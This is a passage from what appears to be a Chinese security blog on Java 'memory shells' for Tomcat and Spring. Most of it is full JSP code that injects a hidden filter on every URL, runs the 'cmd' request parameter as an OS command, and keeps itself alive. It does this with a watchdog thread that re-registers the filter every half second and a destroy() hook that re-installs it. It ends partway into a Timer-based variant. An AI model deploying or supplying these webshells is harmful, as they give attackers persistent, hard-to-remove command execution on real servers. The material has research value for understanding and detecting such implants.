<span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response.getWriter().print(res.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注入成功之后,必须要访问一个requestMapping才会被拦器拦截到,此时带上参数就能执行命令了</p>
]]></content>
      <tags>
        <tag>springMemshell</tag>
      </tags>
  </entry>
  <entry>
    <title>内存马防killed</title>
    <url>/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/</url>
    <content><![CDATA[<p>servlet和filter类型的内存马如何防止被删除呢<span id="more"></span></p>
<p>一种思路就是在servlet和filter的destory中加入再次注册内存马的代码</p>
<p>以filter为例</p>
<p>但是有一点,我不知道这个destory方法会在啥时候被调用,难道是一些查杀工具动态调用destory方法来终止filter的生命周期吗?</p>
<p>而且并不是所有的删除方法都会触发destory方法</p>
<p>还有一种思路,就是创建一个不死线程,一直检测该filter在不在,不在就立马执行注册流程注册一个</p>
<p>我的思路可能比较简单</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424001711544.png" alt="image-20220424001711544"></p>
<p>之前在context中调用了这个addFilterDef方法往filterDefs这个MAP中存入了filter的name和def这个类,我觉得可以通过检测context中该属性是否contains对应的Filter的name来判断是否被destory了,然后让该线程一直运行,直到服务关闭</p>
<p>下面这段代码虽然看起来没问题,但是应该没实现想要的功能,思路应该没问题吧….</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    filter.destroy();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//每隔0.5秒执行一次</span></span><br><span class="line">            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">            <span class="comment">//获取filterDefs并做判断</span></span><br><span class="line"></span><br><span class="line">            Field filterDefsField = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterDefs&quot;</span>);</span><br><span class="line">            filterDefsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap filterDefs = (HashMap) filterDefsField.get(standardContext);</span><br><span class="line">            <span class="keyword">if</span> (!filterDefs.containsKey(<span class="string">&quot;test&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">                FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">                Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">                filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    test();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> testThread().start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>filter的destory好像是在服务器关闭的时候调用的?</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424103747041.png" alt="image-20220424103747041"></p>
<p>destory方法确实是在关闭tomcat的时候调用了</p>
<p>因为是关闭服务器调用的,所以代码调试断点没用,使用find Usages找到在<code>ApplicationFilterConfig#release</code>方法中调用了destory方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424104205259.png" alt="image-20220424104205259"></p>
<p>在<code>StandardContext#filterStop</code>方法中调用了release方法,这个方法的作用呢就是释放当前context的所有过滤器</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424104347716.png" alt="image-20220424104347716"></p>
<p>在standardContext中调用stopInternal(),其中调用到了stop</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424105554811.png" alt="image-20220424105554811"></p>
<p>在lifeCycle的实现类lifeCycleBase中的stop方法中   调用<code>stopInternal()</code>让组件自行实现关闭</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424105659039.png" alt="image-20220424105659039"></p>
<p>综上大概就是我自己找的filter.destory的调用链</p>
<p>对此调用链我有以下不成熟的想法:</p>
<p>1.可以拿来测试destory中插入新注册一个filter的代码能否正常实现</p>
<p>2.既然在服务器关闭的时候会调用到destory方法,是不是可以在destory方法中加入持久化存储filter的代码呢</p>
<p>利用destory新注册一个filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Filter inner=<span class="keyword">new</span> Filter() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">                    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">                    <span class="comment">//加一个系统的判断</span></span><br><span class="line">                    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">                    BufferedReader bufferedReader;</span><br><span class="line">                    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                        isWin = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String len;</span><br><span class="line">                        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilter(inner);</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            filterDef.setFilterClass(inner.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field configs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>用上面的代码,运行之后发现问题很大,首先调用<code>StandardContext#filterStop</code>方法确实调用到了destory方法,但是呢,里面剩余的注册新的filter方法并没有调用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220424111840905.png" alt="image-20220424111840905"></p>
<p>在别的jsp页面获取StandardContext调用filterStop并没有调用到这个filter的destory方法</p>
<h3 id="Timer内存马"><a href="#Timer内存马" class="headerlink" title="Timer内存马"></a>Timer内存马</h3><p>Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code>cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</p>
<p>在线程中获取所需对象的操作和之前tomcat内存马的时候从线程中获取context有异曲同工之妙</p>
<p>模仿着su18大佬的代码调试着跟了一遍流程,写了一遍,他这里写的这个getField函数是真巧妙,我觉得之前通过threadGroup获取context的时候各种getSuperClass都把人整晕了,现在一个函数就能解决问题</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String cmd=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">            Thread[] threads = (Thread[]) getField(threadGroup, <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(Thread thread: threads)&#123;</span><br><span class="line">                <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    String threadName=thread.getName();</span><br><span class="line">                    <span class="keyword">if</span>(threadName.contains(<span class="string">&quot;Poller&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                   